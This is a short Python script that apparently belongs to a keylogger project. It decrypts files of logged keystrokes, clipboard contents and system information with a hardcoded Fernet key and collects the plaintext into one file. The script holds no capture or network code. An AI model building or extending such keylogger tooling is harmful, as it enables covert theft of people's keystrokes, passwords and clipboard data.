from cryptography.fernet import Fernet

key = "pfUx8_Vbt2CXxy2AA38eat8hVvulowvD0iP6A0Vbqcw="

system_information_e = 'e_system.txt'
clipboard_information_e = 'ee_clipboard.txt'
keys_information_e = 'e_keys_logged.txt'

encrypted_files = [ system_information_e,clipboard_information_e,keys_information_e]
count = 0

for decrypting_file in encrypted_files:

    with open(decrypting_file, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1
